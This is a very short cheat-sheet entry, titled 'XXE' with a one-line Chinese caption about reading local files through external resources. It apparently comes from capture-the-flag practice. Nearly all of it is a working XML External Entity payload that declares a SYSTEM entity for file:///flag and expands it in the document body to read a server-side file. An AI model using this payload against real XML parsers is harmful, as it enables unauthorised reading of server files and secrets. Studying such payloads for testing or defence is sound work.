# XXE
1. 利用引入外部資源，對本地檔案做讀取
```
<!DOCTYPE hack[ 
  <!ENTITY xxe SYSTEM "file:///flag"> 
]> 
<root>&xxe;</root>
```
